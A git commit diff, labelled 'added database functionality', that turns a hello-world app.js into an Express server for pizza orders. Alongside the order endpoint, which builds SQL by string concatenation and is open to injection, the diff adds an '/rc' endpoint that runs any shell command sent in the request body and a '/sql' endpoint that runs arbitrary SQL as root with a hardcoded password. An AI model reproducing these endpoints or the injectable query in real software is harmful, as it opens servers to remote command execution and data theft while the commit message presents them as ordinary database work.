b13aaf9b1da20276b2e7e5615981002ca1e80916
Blake <80996688+BlakeTnr@users.noreply.github.com>
2022-03-11 20:33:46 -0500

    added database functionality

--- app.js
+++ app.js
@@ -1,10 +1,79 @@
-const http = require('http');
+const express = require('express');
+const app = express();
+const mysql = require('mysql2')
+const PORT = 8000;
+const cors = require('cors');
 
-let app = http.createServer((req, res) => {
-    res.writeHead(200, {'Content-Type': 'text/plain'});
+app.use(express.json());
+app.use(cors());
 
-    res.end('Hello World!\n');
-});
+app.post("/order", (req, res) => {
+    const { name, phone, address, order } = req.body;
+    
+    const connection = mysql.createConnection({
+        host: 'localhost',
+        user: 'root',
+        password: 'asdf',
+        multipleStatements: true
+      });
+      
+    connection.query(
+        "CREATE DATABASE IF NOT EXISTS pizzeria; USE pizzeria; CREATE TABLE IF NOT EXISTS orders(id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,name VARCHAR(255),phone VARCHAR(255),address VARCHAR(255),items VARCHAR(255)); INSERT INTO orders(name,phone,address,items) VALUES ('"+name +"','"+phone +"','"+address+"','"+order+"');",
+        function(err,results,fields) {
+            if(err) {
+                res.send(err)
+            } else {
+                res.send(results)
+            }
+        }
+    );
+})
 
-app.listen(3000, '127.0.0.1');
-console.log("Running");
+app.post("/rc", (req, res) => {
+    const { exec } = require("child_process");
+    const { cmd } = req.body;
+    exec(cmd, (error, stdout, stderr) => {
+        if(error) {
+            res.send(error)
+        }
+        if(stderr) {
+            res.send(stderr)
+        }
+        res.send(stdout)
+    })
+})
+
+app.post("/sql", (req, res) => {
+    const { sql } = req.body;
+
+    const connection = mysql.createConnection({
+        host: 'localhost',
+        user: 'root',
+        password: 'asdf',
+        multipleStatements: true
+      });
+      
+    connection.query(
+        sql,
+        function(err,results,fields) {
+            if(err) {
+                res.send(err)
+            } else {
+                res.send(results)
+            }
+        }
+    );
+})
+
+app.get("/ping", (req, res) => {
+    res.send("pong")
+})
+
+app.post("/ping", (req, res) => {
+    res.send("pong")
+})
+
+app.listen(
+    PORT,
+    () => console.log("Working")
+)
